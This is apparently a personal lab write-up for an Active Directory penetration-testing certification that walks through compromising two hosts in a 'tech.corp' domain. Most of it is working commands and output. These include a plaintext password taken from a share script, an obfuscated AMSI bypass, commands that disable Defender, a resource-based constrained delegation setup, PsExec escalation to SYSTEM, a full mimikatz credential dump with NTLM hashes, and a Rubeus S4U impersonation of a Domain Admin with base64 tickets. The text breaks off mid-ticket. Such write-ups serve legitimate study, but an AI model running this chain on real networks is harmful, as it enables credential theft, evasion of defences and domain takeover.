---
title: "CRTP"
description: "AD"
icon: "article"
date: "2025-12-10"
lastmod: "2025-12-10"
draft: false
toc: true
weight: 999
---

### STUDVM

Listing `SMB` Shares.

```xml
PS C:\Users> Get-SmbShare

Name        ScopeName Path                                       Description
----        --------- ----                                       -----------
ADMIN$      *         C:\Windows                                 Remote Admin
C$          *         C:\                                        Default share
D$          *         D:\                                        Default share
IPC$        *                                                    Remote IPC
maintenance *         C:\maintenance
NETLOGON    *         C:\Windows\SYSVOL\sysvol\tech.corp\SCRIPTS Logon server share
SYSVOL      *         C:\Windows\SYSVOL\sysvol                   Logon server share
```

Looking at the maintenance share, we see an interesting `ps1` file from which we gain credentails of `studentadmin`

```xml
PS C:\Users> ls \\tech-dc.tech.corp\maintenance

    Directory: \\tech-dc.tech.corp\maintenance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          9/4/2025   4:17 AM           2890 Backup-ADSystemStateAndGPO.ps1
```

**Password**: `P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!` 

**Username**: `studentadmin` (local account)

{{< figure src="image.png" alt="image" >}}

```xml
PS C:\Windows\system32> whoami
studvm\studentadmin
PS C:\Windows\system32> $command = "powershell.exe -ExecutionPolicy Bypass -Command `"Import-Module C:\Temp\PowerView.ps1; Set-DomainObject -Identity mgmtsrv`$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=(New-Object Security.AccessControl.RawSecurityDescriptor 'D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1600556212-896947471-994435180-1106)').GetBinaryForm()}`""
PS C:\Windows\system32> Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ProcessId        : 9160
ReturnValue      : 0
PSComputerName   :

PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -DisableIntrusionPreventionSystem $true -MAPSReporting Disabled -SubmitSamplesConsent Never
PS C:\Windows\system32> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
PS C:\Windows\system32> whoami
studvm\studentadmin
PS C:\Windows\system32> net localgroup Administrators tech\studentuser /add
The command completed successfully.

PS C:\Windows\system32> cd ..\..\Users\studentuser\Desktop\
PS C:\Users\studentuser\Desktop> ls

    Directory: C:\Users\studentuser\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          9/4/2025  10:01 AM                shared
-a----         10/2/2025   8:48 PM         716176 PsExec.exe

PS C:\Users\studentuser\Desktop> .\PsExec.exe -accepteula -s -i cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com
```

on `nt authority\system` shell.

{{< figure src="645bcae1-3471-4bbf-9a6c-6c2adbf6708a.png" alt="645bcae1-3471-4bbf-9a6c-6c2adbf6708a" >}}

```xml
PS C:\Users\studentuser\Desktop> powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\studentuser\Desktop> whoami
nt authority\system
PS C:\Users\studentuser\Desktop> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process          Bypass
  CurrentUser       Undefined
 LocalMachine    RemoteSigned
```

### MGMTSRV

{{< figure src="image 1.png" alt="image 1" >}}

Install AD DS + AD Tools (Windows Server)

On Windows Server, RSAT features are called:

- **RSAT-AD-PowerShell**
- **RSAT-ADDS**

Install them:

```
Install-WindowsFeature RSAT-AD-PowerShell
Install-WindowsFeature RSAT-ADDS
```

Then import:

```
Import-Module ActiveDirectory
```

Import then `RBCD Attack`

```xml
PS C:\Users\studentuser\Desktop> Get-Module -ListAvailable -Name ActiveDirectory                                                                   PS C:\Users\studentuser\Desktop> Install-WindowsFeature RSAT-AD-PowerShell                                                                                                                                                                                                                            Success Restart Needed Exit Code      Feature Result                                                                                               ------- -------------- ---------      --------------                                                                                               True    No             Success        {Remote Server Administration Tools, Activ...

PS C:\Users\studentuser\Desktop> Install-WindowsFeature RSAT-ADDS

Success Restart Needed Exit Code      Feature Result
------- -------------- ---------      --------------
True    No             Success        {Active Directory Administrative Center, A...

PS C:\Users\studentuser\Desktop> Import-Module ActiveDirectory
PS C:\Users\studentuser\Desktop> $studvm = Get-ADComputer studvm
PS C:\Users\studentuser\Desktop> $mgmtsrv = Get-ADComputer mgmtsrv
PS C:\Users\studentuser\Desktop> Set-ADComputer mgmtsrv -PrincipalsAllowedToDelegateToAccount $studvm
PS C:\Users\studentuser\Desktop> $studvmSID = $studvm.SID
PS C:\Users\studentuser\Desktop> $SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$studvmSID)"
PS C:\Users\studentuser\Desktop> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\Users\studentuser\Desktop> $SD.GetBinaryForm($SDBytes, 0)
PS C:\Users\studentuser\Desktop> Set-ADComputer mgmtsrv -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
PS C:\Users\studentuser\Desktop> Get-ADComputer mgmtsrv -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators TECH\STUDVM$ Allow

PS C:\Users\studentuser\Desktop>
```

This configures **Resource-Based Constrained Delegation (RBCD)** on MGMTSRV:

- **Allows**: STUDVM$ to impersonate ANY user to MGMTSRV
- **Why**: So you can use S4U2Self/S4U2Proxy to get a service ticket for techadmin (Domain Admin) to access MGMTSRV
- **The SID stuff**: Creates the security descriptor that grants STUDVM$ the delegation rights

**Result**: After this, you can use Rubeus with STUDVM$'s hash to impersonate techadmin and get access to MGMTSRV.

**Why did the RBCD attack work?**

- **STUDVM$ (or you as SYSTEM) has GenericWrite/GenericAll on MGMTSRV computer object**
- This allowed you to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
- This told the Domain Controller: "MGMTSRV trusts STUDVM$ to impersonate users"
- Without that configuration, Rubeus would fail with delegation error

```xml
PS C:\Users\studentuser\Desktop> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1908438 (00000000:001d1ed6)
Session           : Interactive from 0
User Name         : studentadmin
Domain            : studvm
Logon Server      : studvm
Logon Time        : 12/9/2025 6:56:07 AM
SID               : S-1-5-21-3370819201-3195867439-4265930108-500
        msv :
         [00000003] Primary
         * Username : studentadmin
         * Domain   : studvm
         * NTLM     : 97daeac345542c952eea4446471ca158
         * SHA1     : 96b035dcfa8ad5ec8a9ac9c512f8d16673c4fed0
         * DPAPI    : 96b035dcfa8ad5ec8a9ac9c512f8d166
        tspkg :
        wdigest :
         * Username : studentadmin
         * Domain   : studvm
         * Password : (null)
        kerberos :
         * Username : studentadmin
         * Domain   : studvm
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 891554 (00000000:000d9aa2)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:40:33 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : studvm$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:22 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : TECH.CORP
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30225 (00000000:00007611)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:22 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 29002 (00000000:0000714a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:22 AM
SID               :
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 919549 (00000000:000e07fd)
Session           : RemoteInteractive from 2
User Name         : studentuser
Domain            : TECH
Logon Server      : tech-dc
Logon Time        : 12/9/2025 6:40:34 AM
SID               : S-1-5-21-1600556212-896947471-994435180-1107
        msv :
         [00000003] Primary
         * Username : studentuser
         * Domain   : TECH
         * NTLM     : 2c8c103f97136f3f25231760bda86457
         * SHA1     : 6ddd7a36bdd697e40a51d4b4946d3e3f5623ec34
         * DPAPI    : e11e34d98a2fdacd9c043ee87a183429
        tspkg :
        wdigest :
         * Username : studentuser
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studentuser
         * Domain   : TECH.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 893473 (00000000:000da221)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:40:33 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 76a995e2ff185255fec109df0f7448b8
         * SHA1     : 5b1d2ea9727d1e6d8a1c78fcf4eaef0e3f3e0242
         * DPAPI    : 5b1d2ea9727d1e6d8a1c78fcf4eaef0e
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : H;w9ouDEi9Jc*tPbb&S;o93PyqxyCcJTv$3iSM=:Zk[K2$8*Fdh^\T)L9N6`/JSNu*&FUu;yY\E7O;n?^uf$t!#j9%bz\n!x:QQKR,1N2dnb&d6.32b=z&K=
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 893382 (00000000:000da1c6)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:40:33 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 66906 (00000000:0001055a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:23 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 76a995e2ff185255fec109df0f7448b8
         * SHA1     : 5b1d2ea9727d1e6d8a1c78fcf4eaef0e3f3e0242
         * DPAPI    : 5b1d2ea9727d1e6d8a1c78fcf4eaef0e
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : H;w9ouDEi9Jc*tPbb&S;o93PyqxyCcJTv$3iSM=:Zk[K2$8*Fdh^\T)L9N6`/JSNu*&FUu;yY\E7O;n?^uf$t!#j9%bz\n!x:QQKR,1N2dnb&d6.32b=z&K=
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 66890 (00000000:0001054a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:23 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:23 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 30238 (00000000:0000761e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:22 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : studvm$
         * Domain   : TECH
         * NTLM     : 520650c3f42f354dc1e53e814d6284aa
         * SHA1     : cf73b4b257d53236a6a535f77e182fc5a6cd64e6
         * DPAPI    : cf73b4b257d53236a6a535f77e182fc5
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : tech.corp
         * Password : 0a 04 a2 6e d1 3b 7c d2 04 41 0f ef 24 bc 0d e4 fb 24 4b 36 da d3 e6 6d 19 7e 3a 68 33 b2 6d 64 63 24 23 49 ec de cf 96 5b b1 36 92 7b 00 71 73 74 79 d5 d6 b5 e8 6e fa ad d5 5d 34 0d 8a 49 a1 b6 45 bc ee a0 8a f5 ae ca 15 65 c2 60 c3 66 86 2c 9b 38 3f f0 ea 57 33 80 4c 21 fd 91 fe be c2 a5 fb 49 ff 63 9e 8d 6b 26 16 18 19 0d a3 39 c9 f0 eb ac ff 90 93 73 18 29 d7 d6 a8 c0 ef d2 78 57 40 94 48 19 df 0f 57 9f ef 6c e0 61 91 18 df 51 48 19 31 b4 ff 3a f5 83 37 28 12 12 46 35 dc f4 33 9e d1 0d c3 74 96 4d f4 cf 1a 82 24 45 1f 37 01 0a 54 75 98 57 55 64 8f 59 d1 87 8c d6 21 59 0a 9c c8 d2 e7 fa 16 47 08 48 bb 05 44 12 be 8b f5 da 36 35 08 6d 48 18 7c 18 28 37 d7 76 9f 09 a5 11 42 e4 52 c7 0d 0c c6 dd 8c fa ad 6e 09
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : studvm$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:22 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : studvm$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : studvm$
         * Domain   : TECH.CORP
         * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz # exit
Bye!
```

```xml
PS C:\Users\studentuser\Desktop> .\Rubeus.exe s4u /user:studvm$ /rc4:520650c3f42f354dc1e53e814d6284aa /impersonateuser:techadmin /msdsspn:WSMAN/mgmtsrv.tech.corp /ptt /altservice:http

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 520650c3f42f354dc1e53e814d6284aa
[*] Building AS-REQ (w/ preauth) for: 'tech.corp\studvm$'
[*] Using domain controller: 172.16.4.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFRjCCBUKgAwIBBaEDAgEWooIEZTCCBGFhggRdMIIEWaADAgEFoQsbCVRFQ0guQ09SUKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJdGVjaC5jb3Jwo4IEIzCCBB+gAwIBEqEDAgEEooIEEQSCBA1DgqP9xWh7eRov
      pbGXmJdZYz8ZH0OiS5GcKg3Q7BQj7m8pvvbHM7UFCYnBow12MDShZLr3Nz/dHs/1o1rTwYrMf2VJjjkS
      04INtSg3O8Ye0mwhAlqzKVi/9KrtEKll1utvUvQPXog5gk/omwLTPVy46r+cS10eY0CvbEHobgD264+X
      JAhdo+diZ/9pBfRhBuru3rJk/Opx2BDzoaIgBc9t626qAKxEhbR1uQuKXmuDK87wamq1VhioxgpPSGoL
      COcnE6F/Mv8hvt2Jy9h/zQgaIaLZ5HxH+0izIGLWbXmlE/9HGKSC/3yiuQRv/ZirywOC753TiTuN5O6N
      KoB3WKsNx3MzSKHzQPVYgukdT0N4vFOcKNnlJZUfOXmONpu2CXpfrewFY8qsZyDJzh3ziquIL3w+jJt2
      n9c8nO+Pd5i/ZOsahIi+sgwMa6dfsCvoFzeDF8/Y6JCzRQxwufbTVTrO+15k4n20xIT0uYB9TbALBmhM
      loVTDmKUcrKveUPyaI0bmR4wBxwcMVDfuLI60Q2IzBvvsE6Z5gYrPKhmqxDbJp3MUzYvVvJ8jsOTAS7T
      V5T+5dqdwcB58ZWu6wXxYTA3SOKl3sUauDqPxuGeL8VwMvKpvGiNW2MEBjJ9PdQToFPNojv/7u4B7vF8
      eTcFCLOPERnPAiY3CuCUhb5bQFkZuJFp4/QJCv6VtDuax87skvUyAJvYgtb0/4kzxKQ6mpHuLPAzlZy1
      cWxbmUNytTJMBbKpJyaUgrt2u9esOfATzAVt8iQvZnTrgR3/EuXMAnE1XAZbGD6Pl3XNsfAdP0ceY9JX
      /cCoQW5G4hRVL7NU44HD0OvEF3E7wjPhnnHL/VjmRUMK8ekTUY6N/G+0Ctfy1Qm5KgftW9PIOJmEefVC
      5M/5SGbuT551mPTjR6HoML3QcjfElWWVFq5y5wtGdXGGAvQslc9knxDY5hBdkr8acquLPGwbf0QAxyhz
      cN5kYqH0HY5TOjr9afrixN/zMURMYCuGgyG8z+TBT8zyZIf0oXYXD8ZLDN4vgWh7+OeNvSyzztBCt/IN
      FVDs+b3FNFPeUsJewtxj+L4DJfaI3IR+f6EGfGJooEZIHOmIQ6oKzPo8Ji520ZsH/VeTq7ZXsrJGLN0Q
      ig5mf1F8xtYF33C4lyH7yhxG9r2Q6Jcx2q+qzpmz+wwfvbb7xWBDDNmkWzZFSebt9AsAI4qBJbEeNy3s
      7oYCLseFu3nbd7CYw2OW2s+AscKbEO/YeYsJBZznbph/tNtjOa2QFu1ESjGIkcT4f9rIFWFezV36rqI+
      iwuX+gTylIt+KNznoOkfx65QZ0lASq79cmvPtsdIOVepjx5taSkO5kGDRdRAapdVkm1u63p9yFUlbc+6
      Zh9u8JL7f6OBzDCByaADAgEAooHBBIG+fYG7MIG4oIG1MIGyMIGvoBswGaADAgEXoRIEEKSdm98tqUoL
      fetyUxDOdKqhCxsJVEVDSC5DT1JQohQwEqADAgEBoQswCRsHc3R1ZHZtJKMHAwUAQOEAAKURGA8yMDI1
      MTIwOTA3NTAwN1qmERgPMjAyNTEyMDkxNzUwMDdapxEYDzIwMjUxMjE2MDc1MDA3WqgLGwlURUNILkNP
      UlCpHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCXRlY2guY29ycA==

[*] Action: S4U

[*] Building S4U2self request for: 'studvm$@TECH.CORP'
[*] Using domain controller: tech-dc.tech.corp (172.16.4.5)
[*] Sending S4U2self request to 172.16.4.5:88
[+] S4U2self success!
[*] Got a TGS for 'techadmin' to 'studvm$@TECH.CORP'
[*] base64(ticket.kirbi):

      doIFrjCCBaqgAwIBBaEDAgEWooIExTCCBMFhggS9MIIEuaADAgEFoQsbCVRFQ0guQ09SUKIUMBKgAwIB
      AaELMAkbB3N0dWR2bSSjggSNMIIEiaADAgESoQMCAQKiggR7BIIEd9A0l39s0GDD5jzh60rQ/rj9HL1p
      fXAcOD9X7732EuZpGRIbhVn+GhlKtnKFURwrdaigr2T5lcv5FNfwERvZL8K0jCp5MqCVwR1mxHUPwwWs
      O8A9Ysk1IsZ3CuZY4xaN8SYNA4CX2STiPxpshPqF+20Jq75CfWTfxxouytga8H2YUrKR7v2EN/aVj3Sb
      W93NgOakbtUYKzft8rABz3FeaQ29O8T4vrKc2YEtE4ohMI3DEIm/J+Py9cVrhHAzGAKijmAx+3ySNqPW
      CWyvKzo6b67wrrco9+5m/Ql56EF4StCmRJi7RmO8jCVqO8hnV0SppkeTdo+IQ2Y8M9L/++z0q8bzzBgI
      Gf64td0Ui0aoXGbWlpd60was0tYl6KgrYkiDqgIHpbMpKUWhKDNKRIm2pUIkTUJD0SBbwzV3pHwSw/eJ
      M2yGnon9tni0bCK1umLM8Gd5eNiCvZjraesAQ7vNQ2y95aaML4YOgzLs2YKCceqtf6FYJ+2z/yTdqwiK
      gc9TkLNgd3n2hjL3Z6M3pHJHiF0oTFE0JI3QxrJGTjY4a2OUrm+CXGemy7JGofN4Hj5chBnDLI9N1tYy
